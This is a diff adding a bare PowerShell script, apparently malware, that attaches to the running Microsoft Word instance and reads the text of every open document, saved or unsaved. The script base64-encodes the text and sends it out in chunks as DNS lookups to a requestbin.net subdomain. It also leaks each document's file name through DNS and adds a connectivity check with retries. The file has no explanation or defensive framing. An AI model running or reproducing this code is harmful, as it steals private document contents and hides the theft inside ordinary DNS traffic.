@@ -1,0 +1,69 @@
+function ConnectionTest($dns) {
+	[int]$retryCount = "0"
+	[int]$maxOfRetry = "3"
+	while ($retryCount -lt $maxOfRetry) {
+		try {
+			$a=Resolve-DnsName $dns -ErrorAction Stop
+			return $true
+		}
+		catch {
+			Write-Host "Retrying in 30 seconds..."
+			Start-Sleep -Seconds 30
+			$retryCount = $retryCount + 1
+		}
+	}
+}
+function ReadSavedWord($fileName) {
+	
+    $word = New-Object -ComObject Word.Application
+    $word.Visible = $False 
+    $doc = $word.Documents.Open($fileName, $false, $true) 
+    #$sel = $word.Selection
+	$data = ""
+    foreach ($par in $doc.Paragraphs) {
+		$data = $data + $par.Range.Text
+    }
+    $doc = $null
+    $word.quit()
+    return $data
+}
+function ReadUnsavedWord($openTag, $closeTag, $xmlDoc) {
+	 
+     $pattern = "$openTag(.*?)$closeTag"
+     $result = [regex]::Match($xmlDoc, $pattern).Groups[1].Value
+     return $result
+}
+
+function Exfil($message, $dns) {
+
+	$messageBytes = [System.Text.Encoding]::UTF8.GetBytes($message)
+	$messageBase64 = [System.Convert]::ToBase64String($messageBytes)
+	$msgSize = $messageBase64.Length
+	$chunkSize = 100
+	for ($i = 0; $i -le $msgSize; $i = $i + $chunkSize) {
+		 $currChunk = $messageBase64.Substring($i, [math]::min($chunkSize, $msgSize-$i))
+		 nslookup $currChunk$dns
+		 Start-Sleep 3
+	}
+} 
+
+$dns = ".291e5172f3a5fe638284.d.requestbin.net"
+if (ConnectionTest "google.com") {
+	$word = [Runtime.Interopservices.Marshal]::GetActiveObject('Word.Application')
+	$docs = $word.Documents
+	foreach ($doc in $docs) {
+		$wordLocation = $doc.Name
+		nslookup $wordLocation$dns
+		if (Test-Path $wordLocation) {
+			$docText = ReadSavedWord($wordLocation)
+			Start-Sleep 6
+			Exfil $docText $dns
+		}
+	    else {
+			$xmlDoc = $doc.WordOpenXML
+	 	    Start-Sleep 10
+			$docText = ReadUnsavedWord -openTag "<w:t>" -closeTag "</w:t>" -xmlDoc "$xmlDoc"
+			Exfil $docText $dns
+		}
+	}
+}
